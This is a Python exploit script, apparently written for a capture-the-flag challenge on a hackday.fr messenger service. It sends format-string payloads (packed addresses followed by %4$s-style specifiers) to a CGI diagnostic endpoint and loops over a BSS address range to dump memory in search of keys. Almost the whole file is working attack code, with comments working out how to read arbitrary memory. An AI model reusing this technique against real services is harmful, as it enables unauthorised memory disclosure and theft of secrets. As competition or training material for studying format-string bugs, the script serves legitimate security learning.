#!/usr/bin/env python3
import urllib.request
import urllib.parse
import struct
import time

BASE = "http://millenium-messenger.hackday.fr:8000"

def send_msg_raw(body_bytes):
    encoded = urllib.parse.quote(body_bytes, safe='')
    url = f"{BASE}/cgi-bin/msn_diag?cmd=MSG&body={encoded}"
    try:
        with urllib.request.urlopen(url, timeout=10) as resp:
            return resp.read()
    except Exception as e:
        return b""

def extract_diag(raw):
    marker = b'DIAG '
    idx = raw.find(marker)
    if idx >= 0:
        return raw[idx+5:].rstrip(b'\r\n')
    return raw

# Since we can do arbitrary read with %4$s (if we put address at pos 4)
# Let's read 4 bytes at a time as hex to avoid null termination
# We can use %4$p or just read it as a string and handle the bytes

print("=== Scanning BSS area for potential keys (hex dump) ===")
# 0x08049000 to 0x0804b000
for addr in range(0x08049000, 0x0804b000, 16):
    payload = b""
    line_hex = []
    # For a 16 byte block, we need 4 addresses and 4 format specifiers
    # But wait, our input is at pos 4. 
    # If we put: [ADDR1][ADDR2][ADDR3][ADDR4]%4$s%5$s%6$s%7$s
    # ADDR1 is at pos 4, ADDR2 is at pos 5, etc.
    
    addrs = [addr, addr+4, addr+8, addr+12]
    payload = struct.pack('<IIII', *addrs) + b"|%4$s|%5$s|%6$s|%7$s|"
    
    raw = send_msg_raw(payload)
    content = extract_diag(raw)
    
    # This is tricky because %s stops at nulls.
    # Better: use %4$p %5$p %6$p %7$p to get the values AT those addresses?
    # NO, %p shows the pointer itself (the address). 
    # We want to read the value AT the address.
    # So we MUST use %s or look for a way to read bytes.
    
    # Let's try reading 1 byte at a time? No, too slow.
    # Let's just use the %4$s and hope the key is printable or we can see enough of it.
    
    addr_bytes = struct.pack('<I', addr)
    payload = addr_bytes + b"%4$s"
    raw = send_msg_raw(payload)
    content = extract_diag(raw)
    
    if content and content != b"(null)":
        print(f"0x{addr:08x}: {content.hex()} | {repr(content)}")
    
    time.sleep(0.02)
